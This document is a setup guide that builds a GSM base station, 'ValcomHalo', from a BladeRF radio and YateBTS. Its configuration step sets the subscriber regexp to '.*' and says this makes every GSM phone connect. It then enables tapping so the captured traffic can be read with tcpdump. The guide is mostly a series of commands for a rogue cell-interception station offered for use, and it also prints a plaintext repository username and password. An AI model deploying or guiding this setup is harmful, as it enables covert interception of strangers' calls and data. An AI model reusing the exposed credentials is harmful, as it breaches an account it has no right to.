# Cell Capture
***

**All commands are issued from the terminal unless otherwise noted.**

### Setup Start

    sudo su
    apt-get update
    apt-get install git telnet apache2 php5 libusb-1.0-0 libusb-1.0-0-dbg libusb-1.0-0-dev libgsm1 libgsm1-dev bladerf libbladerf-dev libbladerf0 cmake automake
    cd /
    mkdir halo


### BladeRF Source

    cd /halo
    wget -c https://github.com/Nuand/bladeRF/archive/master.zip
    unzip master.zip
    cd bladeRF-master/host
    mkdir build
    cd build
    cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr/local -DINSTALL_UDEV_RULES=ON ../
    make -j4
    make install > install.log
    ldconfig


### BladeRF x40 firmware

    cd /halo
    wget -c http://www.nuand.com/fx3/bladeRF_fw_v2.0.0.img
    bladeRF-cli -f bladeRF_fw_v2.0.0.img -v verbose
    quit



### Clone Repo

    cd /halo
    git clone https://github.com/stacywebb/cell-capture.git
    username: valcom
    password: Kr3Ml!n
    cd ValcomHalo


### Yate

    cd yate
    ./autogen.sh
    ./configure --prefix=/usr/local
    make -j4
    make install
    ldconfig
    cd ..


### YateBTS

    cd yatebts
    ./autogen.sh
    ./configure --prefix=/usr/local
    make -j4
    make install
    ldconfig


### Halo (NIB) GUI

    cd /var/www/html
    ln -s /usr/local/share/yate/nib_web halo
    chmod -R a+w /usr/local/etc/yate


### Initial Configuration

    nano /usr/local/etc/yate/ybts.conf

> Use the following values:

    Radio.Band=900
    Radio.C0=1000
    Identity.MCC=001
    Identity.MNC=01
    Identity.ShortName=ValcomHalo
    Radio.PowerManager.MaxAttenDB=35
    Radio.PowerManager.MinAttenDB=35

* crtl+o to write file
* ctrl+x to return to prompt


    nano /usr/local/etc/yate/subscribers.conf

#### Use the following values:

    country_code=YOUR_CONTRY_CODE
    regexp=.*


> *Note:*
>
> Using the .* regular expression will make EVERY GSM phone connect to ValcomHalo



#### Open a browser and go to:

> <http://ipaddress/halo>


#### Enable GSM-Tapping

> In the “Tapping” panel, you can enable it for both GSM and GPRS, this will “bounce” every GSM packet to the loopback interface. To view all the GSM traffic use tcpdump on the loopback interface.



#### Configuring the GPRS BTS Operability

    From a command prompt:

    iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE


> Add the following values using the Web GUI:

    Firewall.Enable=no firewall
    MS.IP.Base=xxx.xxx.xxx.xxx (ip address)
    MS.IP.MaxCount=5

￼
#### Start ValcomHalo

> From a command prompt:

    yate -s

> expected response:

    Starting MBTS...
    Yate engine is initialized and starting up on ValcomHalo
    RTNETLINK answers: File exists
    MBTS ready



#### Configure the welcome message


    nano /usr/local/share/yate/scripts/nib.js
